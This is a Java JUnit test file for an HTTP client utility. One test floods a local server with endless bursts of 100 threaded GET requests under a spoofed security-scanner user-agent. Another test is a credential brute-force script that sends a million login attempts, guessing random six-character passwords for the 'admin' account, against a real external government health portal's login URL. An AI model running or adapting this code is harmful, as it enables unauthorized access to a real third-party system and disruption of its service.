package top.danny.tools.net.httpclient;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;
import org.junit.Test;
import top.danny.tools.thread.consumeTime.Executor;
import top.danny.tools.thread.consumeTime.ExecutorInterface;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

/**
 * @author huyuyang@lxfintech.com
 * @Title: HttpClientRequestUtilTest
 * @Copyright: Copyright (c) 2016
 * @Description:
 * @Company: lxjr.com
 * @Created on 2017-07-20 13:57:16
 */
public class HttpClientRequestUtilTest {

    @Test
    public void sendGetTest() {
        while (true) {
            Executor executor = new Executor(new ExecutorInterface() {
                @Override
                public void executeJob() {
                    System.out.println("Job begin……");
                    get();
                    System.out.println("Job end……");
                }
            });
            executor.start(100);
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public void get() {
        String url = "";
        try {
            CloseableHttpClient httpClient = HttpClientRequestUtil.createHttpClient();
            HttpGet httpGet = new HttpGet("http://localhost:10086/front/index.html");
            httpGet.setHeader("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6630586)");
            CloseableHttpResponse response = httpClient.execute(httpGet);
            String result = getResult(response, "UTF-8");
            System.out.println(result);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String getResult(CloseableHttpResponse httpResponse, String charset) throws ParseException, IOException {
        String result = null;
        if (httpResponse == null) {
            return result;
        }
        HttpEntity entity = httpResponse.getEntity();
        if (entity == null) {
            return result;
        }
        result = EntityUtils.toString(entity, charset);
        EntityUtils.consume(entity);// 关闭应该关闭的资源，适当的释放资源 ;也可以把底层的流给关闭了
        return result;
    }

    @Test
    public void sendPostTest() {
        NameValuePair pwd = null;
        String url = "http://yypt.nnjk.gov.cn/ehealth-base-nanning/logon/login";
        for (int i = 0; i < 1000000; i++) {
            List<NameValuePair> nameValuePairList = getNameValuePairList();
            pwd = getPasswordNameValuePair(i);
            nameValuePairList.add(pwd);
            String result = HttpHandler.sendPost(url, nameValuePairList);
            System.out.println("第" + i + "次登陆，密码：" + pwd.getValue() + "，结果：" + result);
        }
    }

    public List<NameValuePair> getNameValuePairList() {
        List<NameValuePair> nameValuePairList = new ArrayList<>();
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "uid";
            }

            @Override
            public String getValue() {
                return "admin";
            }
        });
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "rid";
            }

            @Override
            public String getValue() {
                return "admin";
            }
        });
        return nameValuePairList;
    }

    private NameValuePair getPasswordNameValuePair(int i) {

        return new NameValuePair() {
            @Override
            public String getName() {
                return "pwd";
            }

            @Override
            public String getValue() {
                return getRandomChar(6);
            }
        };
    }

    /**
     * JAVA获得0-9,a-z,A-Z范围的随机数
     *
     * @param length 随机数长度
     * @return String
     */
    public static String getRandomChar(int length) {
        char[] chr = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'};
        Random random = new Random();
        StringBuffer buffer = new StringBuffer();
        for (int i = 0; i < length; i++) {
            buffer.append(chr[random.nextInt(62)]);
        }
        return buffer.toString();
    }

}
